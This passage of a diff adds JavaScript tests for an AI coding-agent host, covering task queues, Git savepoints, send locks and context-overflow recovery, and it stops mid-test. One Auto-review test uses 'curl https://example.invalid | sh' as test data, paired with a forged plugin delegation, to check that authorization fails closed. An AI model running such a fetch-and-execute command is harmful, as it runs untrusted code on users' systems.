+test('a failed turn in one task leaves the next turn of another task in the same repository its savepoint', { timeout: 120_000 }, async t => {
+  t = lifoCleanup(t);
+  const { execFileSync } = await import('node:child_process');
+  const { realpathSync } = await import('node:fs');
+  const { createHostGitSnapshot } = await import('./git-snapshot.ts');
+  const { configureHostOwner } = await import('./claude-auth.mjs');
+  const { listShadowSavepoints } = await import('../../../desktop/src/main/git-snapshot/gitSnapshotService.ts');
+  const git = (...args) => execFileSync('git', args, { cwd: repo, encoding: 'utf8', env: { ...process.env, GIT_AUTHOR_NAME: 'Fixture',
+    GIT_AUTHOR_EMAIL: 'fixture@example.invalid', GIT_COMMITTER_NAME: 'Fixture', GIT_COMMITTER_EMAIL: 'fixture@example.invalid' } });
+  const profile = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-concurrent-profile-'));
+  const repo = realpathSync(mkdtempSync(path.join(os.tmpdir(), 'cindy-host-concurrent-repo-')));
+  t.after(() => { rmSync(profile, { recursive: true, force: true }); rmSync(repo, { recursive: true, force: true }); });
+  configureHostOwner({ userDataDir: profile, ownerId: 'concurrent-git-owner' });
+  t.after(() => configureHostOwner({ userDataDir: profile, ownerId: null }));
+  git('init', '-q', '-b', 'main');
+  writeFileSync(path.join(repo, 'a.txt'), 'one\n');
+  git('add', 'a.txt');
+  git('commit', '-q', '-m', 'init');
+  const snapshot = createHostGitSnapshot({ getSessionMeta: async () => ({ workDir: repo, agentKind: 'claude-code' }) },
+    { getLatestUserMessage: async () => ({ clientId: 'user-1', text: 'change a.txt' }) });
+  // Real Git baseline/snapshot IO has this test's 120s budget; the generic
+  // enqueue helper's 200 short polls can expire before Windows finishes it.
+  const dispatched = new Map(['repo-task-a', 'repo-task-b'].map(id => [id, Promise.withResolvers()]));
+  const snapshotEnded = Promise.withResolvers();
+  const onTurnEnd = snapshot.onTurnEnd.bind(snapshot);
+  snapshot.onTurnEnd = id => {
+    const completion = onTurnEnd(id);
+    completion.then(snapshotEnded.resolve, snapshotEnded.reject);
+    return completion;
+  };
+  const h = createHarness({ getGitSnapshot: () => snapshot,
+    sent: id => dispatched.get(id)?.resolve(),
+    readSession: async id => ({ id, status: 'active', agentKind: 'claude-code', model: 'stored-model',
+      workingDir: repo, providerId: 'xd', permissionMode: 'ask', planModeEnabled: false }) });
+  t.after(() => h.queue.dispose().catch(() => {}));
+  await h.queue.enqueue('repo-task-a', { clientId: 'a-1', text: 'first' });
+  await dispatched.get('repo-task-a').promise;
+  const a = h.maker.getSession('repo-task-a');
+  a.emit({ type: 'error', data: { message: 'provider failed', isTerminal: true }, sessionTurnGeneration: a.generation });
+  await waitFor(() => !h.queue.projection('repo-task-a').turnInProgress);
+  await h.queue.enqueue('repo-task-b', { clientId: 'b-1', text: 'second' });
+  await dispatched.get('repo-task-b').promise;
+  writeFileSync(path.join(repo, 'a.txt'), 'two\n');
+  const b = h.maker.getSession('repo-task-b');
+  b.emit({ type: 'done', data: {}, sessionTurnGeneration: b.generation });
+  await snapshotEnded.promise;
+  const labels = (await listShadowSavepoints(repo, 'repo-task-b')).entries.map(entry => entry.label);
+  assert.deepEqual(labels, ['改动 a.txt', '本轮开始时的工作区基线']);
+});
+
+async function changeRecordFixture(t) {
+  const { configureUserDataDir } = await import('../../../desktop/src/main/userDataPath.ts');
+  const store = await import('../../../desktop/src/main/turn-change-set/store.ts');
+  const { turnChangeSetSessionDirectory } = await import('../../../desktop/src/main/turn-change-set/storagePaths.ts');
+  const profile = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-turn-change-'));
+  const workDir = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-turn-work-'));
+  t.after(() => { rmSync(profile, { recursive: true, force: true }); rmSync(workDir, { recursive: true, force: true }); });
+  configureUserDataDir(profile);
+  writeFileSync(path.join(workDir, 'a.txt'), 'one\n');
+  const calls = [];
+  const gitSnapshot = {
+    async onTurnStart(id) { calls.push(['start', id]); },
+    onTurnAbort(id) { calls.push(['abort', id]); },
+    async onTurnEnd(id) { calls.push(['end', id]); },
+    onSessionClosed(id) { calls.push(['closed', id]); },
+  };
+  const readSession = async id => ({ id, status: 'active', agentKind: 'claude-code', model: 'stored-model',
+    workingDir: workDir, providerId: 'xd', permissionMode: 'ask', planModeEnabled: false });
+  const capture = id => store.captureKnownFileBefore({ sessionId: id, provider: 'claude-code', cwd: workDir,
+    targetPath: path.join(workDir, 'a.txt') });
+  const entries = async id => {
+    await store.waitForTurnChangeSetPersistence();
+    const file = path.join(turnChangeSetSessionDirectory(profile, id), 'index.json');
+    return existsSync(file) ? JSON.parse(readFileSync(file, 'utf8')).entries : [];
+  };
+  return { calls, gitSnapshot, readSession, capture, entries, workDir, store };
+}
+
+// The Host finalize is the desktop rule from sessionEventPreparation.ts, written in
+// turn-executor.mjs; each terminal shape lands in the state the desktop records.
+for (const [label, terminal, state] of [
+  ['a completed native turn', { type: 'done', data: { raw: { id: 'turn-1', status: 'completed' } } }, 'complete'],
+  ['a native turn that did not complete', { type: 'done', data: { raw: { id: 'turn-2', status: 'interrupted' } } }, 'partial'],
+  ['a terminal error', { type: 'error', data: { message: 'provider failed', isTerminal: true } }, 'partial'],
+  ['a silent-stop done', { type: 'done', data: { silentStop: true } }, 'complete'],
+]) {
+  test(`the change record of ${label} is stored as ${state}`, async t => {
+    t = lifoCleanup(t);
+    const f = await changeRecordFixture(t);
+    const h = createHarness({ getGitSnapshot: () => f.gitSnapshot, readSession: f.readSession });
+    const id = `task-${state}-${label.length}`;
+    await enqueue(h, id, { clientId: `u-${label.length}`, text: 'edit a.txt' });
+    await f.capture(id);
+    writeFileSync(path.join(f.workDir, 'a.txt'), 'two\n');
+    h.maker.getSession(id).emit(terminal);
+    await waitFor(() => !h.queue.projection(id).turnInProgress);
+    assert.deepEqual((await f.entries(id)).map(entry => [entry.anchorClientId, entry.state]), [[`u-${label.length}`, state]]);
+    // A done carrying native turn data also stores the Codex plan through the DB,
+    // which this queue fixture does not open; that write is outside this check.
+    await h.queue.dispose().catch(() => {});
+  });
+}
+
+test('a durable user turn that is not dispatched drops its change record and Git baseline', async t => {
+  t = lifoCleanup(t);
+  const f = await changeRecordFixture(t);
+  const h = createHarness({ getGitSnapshot: () => f.gitSnapshot, readSession: f.readSession });
+  const create = h.maker.createSession;
+  h.maker.createSession = async opts => {
+    const session = await create(opts);
+    // The vendor refuses after the user row and the dispatch hooks ran; the
+    // record already holds a captured file at that point.
+    session.send = async (_text, sendOpts = {}) => {
+      sendOpts.onTurnReserved?.(++session.generation);
+      await sendOpts.beforeProviderStart?.();
+      await sendOpts.onAccepted?.(sendOpts.signal);
+      await f.capture(opts.id);
+      writeFileSync(path.join(f.workDir, 'a.txt'), 'refused edit\n');
+      return { accepted: false };
+    };
+    return session;
+  };
+  await h.queue.enqueue('s-undispatched', { clientId: 'never-dispatched', text: 'refused' });
+  await waitFor(() => f.calls.some(call => call[0] === 'abort'));
+  assert.deepEqual(f.calls, [['start', 's-undispatched'], ['abort', 's-undispatched']]);
+  // Nothing is left to persist: a finalize now writes no record.
+  await f.store.finalizeTurnChangeSet('s-undispatched', null, 'complete');
+  assert.deepEqual(await f.entries('s-undispatched'), []);
+  await h.queue.dispose();
+});
+
+// Desktop sessionBindingLifecycle.ts: close cleanup runs only for the bound instance;
+// a replacement drops the previous instance's unfinished record; a late close of an
+// instance that is no longer bound changes nothing.
+test('close cleanup follows the bound instance, not the task id', async t => {
+  t = lifoCleanup(t);
+  const f = await changeRecordFixture(t);
+  const h = createHarness({ getGitSnapshot: () => f.gitSnapshot, readSession: f.readSession });
+  const create = h.maker.createSession;
+  const statusListeners = new Map();
+  h.maker.createSession = async opts => {
+    const session = await create(opts);
+    const listeners = new Set();
+    session.onStatusChange = listener => { listeners.add(listener); return () => listeners.delete(listener); };
+    statusListeners.set(session, listeners);
+    return session;
+  };
+  const closeInstance = session => { for (const listener of [...statusListeners.get(session)]) listener('closed'); };
+
+  await enqueue(h, 'task-swap', { clientId: 'u-first', text: 'first' });
+  const first = h.maker.getSession('task-swap');
+  first.emit({ type: 'done', data: {} });
+  await waitFor(() => !h.queue.projection('task-swap').turnInProgress);
+  // The engine drops the first instance without a Host close.
+  h.maker.sessions.delete('task-swap');
+  closeInstance(first);
+  assert.deepEqual(f.calls.filter(call => call[0] === 'closed'), [['closed', 'task-swap']]);
+
+  await h.queue.enqueue('task-swap', { clientId: 'u-second', text: 'second' });
+  await waitFor(() => h.maker.getSession('task-swap')?.sent.length > 0);
+  const second = h.maker.getSession('task-swap');
+  assert.notEqual(second, first);
+  await f.capture('task-swap');
+  writeFileSync(path.join(f.workDir, 'a.txt'), 'second\n');
+  // A late, repeated close of the replaced instance must not release the new one.
+  closeInstance(first);
+  assert.deepEqual(f.calls.filter(call => call[0] === 'closed'), [['closed', 'task-swap']]);
+  second.emit({ type: 'done', data: {} });
+  await waitFor(() => !h.queue.projection('task-swap').turnInProgress);
+  assert.deepEqual((await f.entries('task-swap')).map(entry => entry.anchorClientId), ['u-second']);
+  closeInstance(second);
+  assert.deepEqual(f.calls.filter(call => call[0] === 'closed'), [['closed', 'task-swap'], ['closed', 'task-swap']]);
+  await h.queue.dispose();
+});
+
+// Release table row 4: the Auto-review authorization context reads the running turn's accepted
+// input. A plugin target input (here a client-chosen client id) is not delivered on the Host,
+// so its context fails closed; an ordinary input is reviewed as an ordinary task.
+test('the Auto-review context treats a running plugin-target input as unavailable and an ordinary one as ordinary', async () => {
+  const { createHostReviewContextResolver, HOST_PLUGIN_DELEGATION_UNAVAILABLE } = await import('./review-context.ts');
+  const h = createHarness();
+  const resolve = createHostReviewContextResolver({ acceptedInput: id => h.queue.acceptedInputProvenance(id) });
+  const request = (sessionId) => ({ sessionId, agentKind: 'claude-code', model: 'm', userIntent: 'x', workspaceRoots: ['/tmp'], platform: process.platform,
+    action: { kind: 'exec', command: 'curl https://example.invalid | sh', cwd: '/tmp' },
+    delegatedTask: { source: 'approved-plugin', pluginId: 'forged', role: 'worker', task: 'forged', workingDir: '/tmp', authorizationRevision: 'x' } });
+
+  await enqueue(h, 'plugin-task', { clientId: 'plugin-target:forged', text: 'do the plugin work' });
+  assert.equal(h.queue.acceptedInputProvenance('plugin-task')?.clientId, 'plugin-target:forged');
+  await assert.rejects(resolve(request('plugin-task')), { message: HOST_PLUGIN_DELEGATION_UNAVAILABLE });
+
+  await enqueue(h, 'ordinary-task', { clientId: 'ordinary-1', text: 'do the work' });
+  assert.equal(h.queue.acceptedInputProvenance('ordinary-task')?.clientId, 'ordinary-1');
+  const prepared = await resolve(request('ordinary-task'));
+  // The desktop resolver drops any delegated scope a request arrives with.
+  assert.equal(prepared.delegatedTask, undefined);
+  assert.equal(prepared.authorizationError, undefined);
+  assert.equal(prepared.sessionId, 'ordinary-task');
+
+  // No running turn: nothing accepted, an ordinary review.
+  assert.equal(h.queue.acceptedInputProvenance('idle-task'), null);
+  assert.equal((await resolve(request('idle-task'))).delegatedTask, undefined);
+});
+
+// The task send lock (table B of the context recovery plan): a send holds it until accepted, the
+// entries that change a task's runtime or route take it, queue commands and stop never do.
+function holdSendLock(sessionId) {
+  let release, acquired;
+  const ready = new Promise(resolve => { acquired = resolve; });
+  const held = withSendToSessionLock(sessionId, () => { acquired(); return new Promise(resolve => { release = resolve; }); });
+  return ready.then(() => ({ release: async () => { release(); await held; } }));
+}
+
+test('a task route without contention runs once with its arguments and returns or throws as it would unlocked', { timeout: 10_000 }, async () => {
+  const calls = [];
+  const route = lockSessionRoute(async (sessionId, ...args) => {
+    calls.push([sessionId, ...args]);
+    if (args[0] === 'fail') throw new Error('route failed');
+    return { sessionId, args };
+  });
+  assert.deepEqual(await route('lock-plain', 'patch', 2), { sessionId: 'lock-plain', args: ['patch', 2] });
+  await assert.rejects(route('lock-plain', 'fail'), /route failed/);
+  assert.deepEqual(await route('lock-plain', 'after'), { sessionId: 'lock-plain', args: ['after'] }, 'a failed route releases the lock');
+  assert.deepEqual(calls, [['lock-plain', 'patch', 2], ['lock-plain', 'fail'], ['lock-plain', 'after']]);
+});
+
+test('a task route change waits for the task\'s send to be accepted', { timeout: 10_000 }, async t => {
+  const h = createHarness();
+  t.after(() => h.queue.dispose());
+  const order = [];
+  let release, entered;
+  const gate = new Promise(resolve => { release = resolve; });
+  const reached = new Promise(resolve => { entered = resolve; });
+  const create = h.maker.createSession.bind(h.maker);
+  h.maker.createSession = async opts => {
+    const session = await create(opts);
+    const send = session.send.bind(session);
+    session.send = async (text, sendOptions) => {
+      entered();
+      await gate;
+      const result = await send(text, sendOptions);
+      order.push('send accepted');
+      return result;
+    };
+    return session;
+  };
+  await h.queue.enqueue('lock-update', { clientId: 'first', text: 'first' });
+  await reached;
+  const update = lockSessionRoute(async () => { order.push('update'); })('lock-update');
+  await new Promise(resolve => setImmediate(resolve));
+  assert.deepEqual(order, [], 'the update waits while the send holds the lock');
+  release();
+  await update;
+  assert.deepEqual(order, ['send accepted', 'update']);
+});
+
+test('deleting a task under its send lock waits for its command chain, whose commands finish', { timeout: 10_000 }, async t => {
+  let releaseRead, readEntered;
+  const readGate = new Promise(resolve => { releaseRead = resolve; });
+  const readReached = new Promise(resolve => { readEntered = resolve; });
+  let gated = true;
+  const h = createHarness({ readSession: async sessionId => {
+    if (gated) { gated = false; readEntered(); await readGate; }
+    return { id: sessionId, status: 'active', agentKind: 'claude-code', model: 'stored-model', workingDir: '/tmp',
+      providerId: 'xd', permissionMode: 'ask', planModeEnabled: false };
+  } });
+  t.after(() => h.queue.dispose());
+  const enqueued = h.queue.enqueue('lock-delete', { clientId: 'pending', text: 'pending' });
+  await readReached;
+  const deleted = lockSessionRoute(sessionId => h.queue.disposeSession(sessionId))('lock-delete');
+  releaseRead();
+  const [command, deletion] = await Promise.allSettled([enqueued, deleted]);
+  assert.ok(command.status === 'fulfilled' || command.status === 'rejected', 'the queued command finished');
+  assert.equal(deletion.status, 'fulfilled');
+});
+
+test('queue commands finish while another holder has the task send lock; the queued send waits for it', { timeout: 10_000 }, async t => {
+  const h = createHarness();
+  t.after(() => h.queue.dispose());
+  const lock = await holdSendLock('lock-commands');
+  await h.queue.enqueue('lock-commands', { clientId: 'waiting', text: 'waiting' });
+  await h.queue.getProjection('lock-commands');
+  await new Promise(resolve => setImmediate(resolve));
+  assert.equal(h.maker.sessions.get('lock-commands')?.sent.length ?? 0, 0, 'the send waits for the lock');
+  await lock.release();
+  await waitFor(() => h.maker.sessions.get('lock-commands')?.sent.length === 1);
+});
+
+test('stopping a task takes effect while another holder has its send lock', { timeout: 10_000 }, async t => {
+  const h = createHarness();
+  t.after(() => h.queue.dispose());
+  await h.queue.enqueue('lock-stop', { clientId: 'running', text: 'running' });
+  await waitFor(() => h.maker.sessions.get('lock-stop')?.sent.length === 1);
+  const session = h.maker.sessions.get('lock-stop');
+  const lock = await holdSendLock('lock-stop');
+  await h.queue.stop('lock-stop');
+  assert.equal(session.aborted, 1, 'the stop did not wait for the lock');
+  await lock.release();
+});
+
+// A send that is never accepted holds the lock until the lock's watchdog settles its entry
+// (SEND_LOCK_BAIL_MS, five minutes, sendToSessionLock.ts); deleting that task then completes.
+test('deleting a task whose send is never accepted completes once the send lock times out', { timeout: 10_000 }, async t => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const h = createHarness();
+  t.after(() => h.queue.dispose());
+  let entered;
+  const reached = new Promise(resolve => { entered = resolve; });
+  const create = h.maker.createSession.bind(h.maker);
+  h.maker.createSession = async opts => {
+    const session = await create(opts);
+    session.send = async () => { entered(); return new Promise(() => {}); };
+    return session;
+  };
+  await h.queue.enqueue('lock-bail', { clientId: 'stuck', text: 'stuck' });
+  await reached;
+  let deleted = false;
+  const deletion = lockSessionRoute(sessionId => h.queue.disposeSession(sessionId))('lock-bail')
+    .then(() => { deleted = true; });
+  const settle = async () => { for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve)); };
+  await settle();
+  t.mock.timers.tick(5 * 60_000 - 1);
+  await settle();
+  assert.equal(deleted, false, 'the deletion waits while the stuck send holds the lock');
+  t.mock.timers.tick(1);
+  await deletion;
+  assert.equal(h.maker.sessions.has('lock-bail'), false, 'the task runtime is closed');
+  assert.deepEqual(h.queue.projection('lock-bail').pendingQueue, []);
+});
+
+test('stopping a task whose send is not yet accepted lets its deletion run without waiting for the lock timeout', { timeout: 10_000 }, async t => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const h = createHarness();
+  t.after(() => h.queue.dispose());
+  let entered;
+  const reached = new Promise(resolve => { entered = resolve; });
+  const create = h.maker.createSession.bind(h.maker);
+  h.maker.createSession = async opts => {
+    const session = await create(opts);
+    // Not accepted until cancelled: the input's abort signal ends the start.
+    session.send = async (_text, sendOptions = {}) => {
+      entered();
+      return new Promise((_, reject) => sendOptions.signal?.addEventListener('abort',
+        () => reject(new Error('start cancelled')), { once: true }));
+    };
+    return session;
+  };
+  await h.queue.enqueue('lock-stop-delete', { clientId: 'starting', text: 'starting' });
+  await reached;
+  await h.queue.stop('lock-stop-delete');
+  await lockSessionRoute(sessionId => h.queue.disposeSession(sessionId))('lock-stop-delete');
+  assert.equal(h.maker.sessions.has('lock-stop-delete'), false, 'deleted with no clock advance');
+});
+
+test('a holder of the task send lock passes straight through a route of the same task on its own chain', { timeout: 10_000 }, async () => {
+  const order = [];
+  await withSendToSessionLock('lock-reentry', async () => {
+    await lockSessionRoute(async () => { order.push('route'); })('lock-reentry');
+    order.push('holder');
+  });
+  assert.deepEqual(order, ['route', 'holder']);
+});
+
+// Context recovery claims a turn's terminal error (context-recovery.ts, contextRecoveryTerminal.ts).
+// The recovery factory is a stub here; its assembly comes with the next checkpoint.
+const OVERFLOW = { message: 'prompt is too long: 210000 tokens > 200000 maximum', reason: CONTEXT_OVERFLOW_REASON, isTerminal: true };
+
+function recoveryHarness(t, rollover, overrides = {}) {
+  const git = [];
+  const h = createHarness({ getRecoveryRollover: () => rollover,
+    getGitSnapshot: () => ({ onTurnStart() { git.push('start'); }, onTurnAbort() { git.push('abort'); },
+      onTurnEnd() { git.push('end'); }, onSessionClosed() {} }), ...overrides });
+  t.after(() => h.queue.dispose());
+  const run = async (sessionId, data = OVERFLOW) => {
+    await h.queue.enqueue(sessionId, { clientId: `${sessionId}-input`, text: 'long task' });
+    await waitFor(() => h.maker.sessions.get(sessionId)?.sent.length === 1);
+    const session = h.maker.sessions.get(sessionId);
+    session.emit({ type: 'error', data, sessionTurnGeneration: session.generation, sessionInstanceId: session.instanceId });
+    return session;
+  };
+  const clientErrors = sessionId => h.events.filter(event => event.sessionId === sessionId && event.type === 'error');
+  const errorRows = sessionId => h.persisted.filter(row => row.sessionId === sessionId && row.role === 'error');
+  return { h, git, run, clientErrors, errorRows };
+}
+
+// The claim x recovery result matrix (plan table C), cell by cell: what the client sees, the error
+// row, what the coordinator holds, and the Git baseline. Usage: the Host records none yet (release
+// table, usage before 2e), so recovery changes nothing there.
+for (const cell of [
+  { name: 'an overflow error nobody claims', claim: 'idle', recovered: null, client: 1, rows: 1 },
+  { name: 'a claimed overflow error that recovers', claim: 'claimed', recovered: true, client: 0, rows: 0 },
+  { name: 'a claimed overflow error whose recovery fails', claim: 'claimed', recovered: false, client: 1, rows: 1 },
+  { name: 'a claimed overflow error whose recovery throws', claim: 'claimed', recovered: 'throw', client: 1, rows: 1 },
+  { name: 'a duplicate overflow error while its recovery is in flight', claim: 'in-flight', recovered: null, client: 0, rows: 0 },
+]) {
+  test(`context recovery: ${cell.name}`, { timeout: 10_000 }, async t => {
+    const id = `recovery-${cell.claim}-${String(cell.recovered)}`;
+    const seen = [];
+    let coordinatorErrorAtRecovery;
+    let recoveryEnded;
+    const ended = new Promise(resolve => { recoveryEnded = resolve; });
+    const rollover = {
+      claim: (_id, _turn, recoverable) => (recoverable ? cell.claim : 'idle'),
+      tryRecover: async () => {
+        seen.push('recover');
+        coordinatorErrorAtRecovery = r.h.queue.projection(id).error;
+        try {
+          if (cell.recovered === 'throw') throw new Error('recovery failed');
+          return cell.recovered;
+        } finally { recoveryEnded(); }
+      },
+    };
+    const r = recoveryHarness(t, rollover);
+    await r.run(id);
+    await waitFor(() => Boolean(r.h.queue.projection(id).error));
+    if (cell.claim === 'claimed') {
+      await ended;
+      await waitFor(() => r.errorRows(id).length === cell.rows);
+      assert.deepEqual(seen, ['recover']);
+      assert.ok(coordinatorErrorAtRecovery, 'recovery starts after the coordinator holds the claimed input\'s error');
+    } else {
+      await waitFor(() => r.errorRows(id).length === cell.rows);
+      assert.deepEqual(seen, [], 'only a claim starts recovery');
+    }
+    await new Promise(resolve => setImmediate(resolve));
+    assert.equal(r.clientErrors(id).length, cell.client, 'error events the client sees');
+    assert.equal(r.errorRows(id).length, cell.rows, 'error rows written');
+    assert.match(r.h.queue.projection(id).error, /prompt is too long/, 'the coordinator holds the error');
+    assert.deepEqual(r.git, ['start', 'abort'], 'the claimed turn cancels its baseline either way');
+    if (cell.client && cell.claim === 'claimed') {
+      assert.equal(typeof r.clientErrors(id)[0].persistId, 'string', 'a failed recovery shows the error with its row id');
+    }
+  });
+}
+
+test('context recovery: an error that is not overflow-class takes the normal path with recovery assembled', { timeout: 10_000 }, async t => {
+  let claimed = 0;
+  const r = recoveryHarness(t, { claim: (_id, _turn, recoverable) => { if (recoverable) claimed += 1; return recoverable ? 'claimed' : 'idle'; },
+    tryRecover: async () => { throw new Error('must not recover'); } });
+  await r.run('recovery-other', { message: 'upstream unavailable', isTerminal: true });
+  await waitFor(() => r.errorRows('recovery-other').length === 1);
+  assert.equal(claimed, 0);
+  assert.equal(r.clientErrors('recovery-other').length, 1);
+  assert.deepEqual(r.git, ['start', 'abort']);
+});
+
+test('context recovery: an overflow error arriving after the Host settled a stop is not claimed', { timeout: 10_000 }, async t => {
+  let claims = 0;
+  const r = recoveryHarness(t, { claim: () => { claims += 1; return 'claimed'; }, tryRecover: async () => true });
+  await r.h.queue.enqueue('recovery-stopped', { clientId: 'stopped-input', text: 'long task' });
+  await waitFor(() => r.h.maker.sessions.get('recovery-stopped')?.sent.length === 1);
+  const session = r.h.maker.sessions.get('recovery-stopped');
+  await r.h.queue.stop('recovery-stopped');
+  session.emit({ type: 'error', data: OVERFLOW, sessionTurnGeneration: session.generation, sessionInstanceId: session.instanceId });
+  await new Promise(resolve => setImmediate(resolve));
+  assert.equal(claims, 0, 'the stopped turn is already settled; its late terminal is dropped before any claim');
+  assert.equal(r.clientErrors('recovery-stopped').length, 0);
+});
+
+// Host shutdown while a recovery is in flight: recoveries end as failures and write their rows first,
+// all together within RECOVERY_SHUTDOWN_WAIT_MS; then the tasks are stopped as before.
+test('context recovery: a recovery that ends within the shutdown limit writes its error row before the stop', { timeout: 10_000 }, async t => {
+  const order = [];
+  let fail;
+  const failed = new Promise(resolve => { fail = resolve; });
+  let started;
+  const recovering = new Promise(resolve => { started = resolve; });
+  const r = recoveryHarness(t, { claim: (_id, _turn, recoverable) => (recoverable ? 'claimed' : 'idle'),
+    tryRecover: async () => { started(); await failed; return false; } },
+  { persistMessage: async (sessionId, input) => { if (input.role === 'error') order.push('error row'); } });
+  const session = await r.run('recovery-shutdown');
+  await recovering;
+  const abort = session.abort.bind(session);
+  session.abort = async () => { order.push('stop'); await abort(); };
+  const disposing = r.h.queue.dispose();
+  await new Promise(resolve => setImmediate(resolve));
+  assert.deepEqual(order, [], 'the shutdown waits for the recovery before stopping');
+  fail();
+  await disposing;
+  assert.deepEqual(order, ['error row', 'stop']);
+});
+
+// A real migrated profile database: the Host's message store writes the rows and the desktop's
+// error-tail query reads them, as after a restart.
+async function recoveryDatabase(t) {
+  // The development build refuses to migrate a database it takes for the official shared profile
+  // (XDT_OFFICIAL_SHARED_PROFILE=1, set when this process runs inside a Cindy task; migrate.ts).
+  // This is a fixture profile, so the flag is cleared for this test only. t.after runs whether the
+  // test passes or fails, so the flag is always restored; node:test runs this file's tests one at
+  // a time, so no other test reads the cleared value.
+  const sharedProfile = process.env.XDT_OFFICIAL_SHARED_PROFILE;
+  delete process.env.XDT_OFFICIAL_SHARED_PROFILE;
+  t.after(() => { if (sharedProfile !== undefined) process.env.XDT_OFFICIAL_SHARED_PROFILE = sharedProfile; });
+  const root = mkdtempSync(path.join(os.tmpdir(), 'cindy-host-recovery-db-'));
+  const profile = path.join(root, 'profile');
+  mkdirSync(profile, { recursive: true });
+  configureHostOwner({ userDataDir: profile, ownerId: 'owner-recovery' });
+  configureAppDataDir(path.join(root, 'app-data'));
+  const layout = hostRuntimeLayout();
+  const opened = await openOwnerDatabase({ userDataDir: profile, ownerId: 'owner-recovery',
+    isPackaged: false, drizzleDir: layout.drizzleDir, sqliteVecExtPath: layout.sqliteVecPath });
+  const database = createDbClientForHandle({ db: opened.db, drizzle: opened.drizzle, dispose: async () => opened.db.close() });
+  setCurrentDbClient(database, 'owner-recovery');
+  t.after(async () => { clearCurrentDbClient(); await database.dispose(); rmSync(root, { recursive: true, force: true }); });
+  const createTask = id => new OwnerSessionStorage({ db: () => database }).create({ id, title: 'Recovery fixture',
+    agentKind: 'claude-code', model: 'stored-model', workDir: root });
+  const errorRows = id => opened.db.prepare("SELECT client_id FROM messages WHERE session_id = ? AND role = 'error'").all(id);
+  return { root, db: opened.db, createTask, errorRows, persistMessage: createHostMessageStore({ getOwner: getCurrentDbClientSnapshot, publish: () => {} }) };
+}
+
+test('context recovery: at the shutdown limit the Host writes the running recovery\'s error row once; after restart the task is an unhandled error and takes new input', { timeout: 30_000 }, async t => {
+  const db = await recoveryDatabase(t);
+  await db.createTask('recovery-timeout');
+  let started;
+  const recovering = new Promise(resolve => { started = resolve; });
+  const r = recoveryHarness(t, { claim: (_id, _turn, recoverable) => (recoverable ? 'claimed' : 'idle'),
+    tryRecover: () => { started(); return new Promise(() => {}); } }, { persistMessage: db.persistMessage });
+  const session = await r.run('recovery-timeout');
+  await recovering;
+  await waitFor(() => Boolean(r.h.queue.projection('recovery-timeout').error));
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  let disposed = false;
+  const disposing = r.h.queue.dispose().then(() => { disposed = true; });
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  t.mock.timers.tick(RECOVERY_SHUTDOWN_WAIT_MS - 1);
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  assert.equal(disposed, false, 'the shutdown waits up to the limit');
+  assert.equal(db.errorRows('recovery-timeout').length, 0);
+  t.mock.timers.tick(1);
+  await disposing;
+  t.mock.timers.reset();
+  assert.equal(session.aborted, 1, 'the task is stopped after the limit');
+  assert.equal(db.errorRows('recovery-timeout').length, 1, 'exactly one error row, on disk before the stop');
+  assert.equal(r.clientErrors('recovery-timeout').length, 0, 'not shown: the Host is closing');
+  assert.ok((await listErrorTailPendingRows()).some(row => row.sessionId === 'recovery-timeout'),
+    'after restart the task is listed as an unhandled error');
+  const restarted = createHarness({ persistMessage: db.persistMessage });
+  t.after(() => restarted.queue.dispose());
+  await restarted.queue.enqueue('recovery-timeout', { clientId: 'after-restart', text: 'continue' });
+  await waitFor(() => restarted.maker.getSession('recovery-timeout')?.sent.length === 1);
+});
+
+test('context recovery: a recovery that fails after the shutdown wrote its row writes no second row', { timeout: 10_000 }, async t => {
+  let started, fail;
+  const recovering = new Promise(resolve => { started = resolve; });
+  const late = new Promise(resolve => { fail = resolve; });
+  const r = recoveryHarness(t, { claim: (_id, _turn, recoverable) => (recoverable ? 'claimed' : 'idle'),
+    tryRecover: async () => { started(); await late; return false; } });
+  await r.run('recovery-late');
+  await recovering;
+  await waitFor(() => Boolean(r.h.queue.projection('recovery-late').error));
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const disposing = r.h.queue.dispose();
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  t.mock.timers.tick(RECOVERY_SHUTDOWN_WAIT_MS);
+  await disposing;
+  t.mock.timers.reset();
+  assert.equal(r.errorRows('recovery-late').length, 1);
+  fail();
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  assert.equal(r.errorRows('recovery-late').length, 1, 'the late failure path writes no second row');
+  assert.equal(r.clientErrors('recovery-late').length, 0, 'and shows nothing');
+});
+
+test('context recovery: a recovery whose replay was accepted is neither awaited nor given an error row at shutdown', { timeout: 10_000 }, async t => {
+  let started;
+  const recovering = new Promise(resolve => { started = resolve; });
+  const r = recoveryHarness(t, { claim: (_id, _turn, recoverable) => (recoverable ? 'claimed' : 'idle'),
+    tryRecover: () => {
+      // The factory calls onRebuilt once the replay is accepted, then may still await.
+      r.h.queue.noteContextRecoveryRebuilt('recovery-rebuilt');
+      started();
+      return new Promise(() => {});
+    } });
+  await r.run('recovery-rebuilt');
+  await recovering;
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  await r.h.queue.dispose();
+  assert.equal(r.errorRows('recovery-rebuilt').length, 0, 'no error row for a recovery that succeeded');
+});
+
+test('context recovery: two tasks recovering at shutdown share one wait limit', { timeout: 10_000 }, async t => {
+  const rollover = { claim: (_id, _turn, recoverable) => (recoverable ? 'claimed' : 'idle'), tryRecover: () => new Promise(() => {}) };
+  const r = recoveryHarness(t, rollover);
+  await r.run('recovery-a');
+  await r.run('recovery-b');
+  await waitFor(() => Boolean(r.h.queue.projection('recovery-a').error && r.h.queue.projection('recovery-b').error));
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  let disposed = false;
+  const disposing = r.h.queue.dispose().then(() => { disposed = true; });
+  for (let i = 0; i < 20; i += 1) await new Promise(resolve => setImmediate(resolve));
+  t.mock.timers.tick(RECOVERY_SHUTDOWN_WAIT_MS - 1);
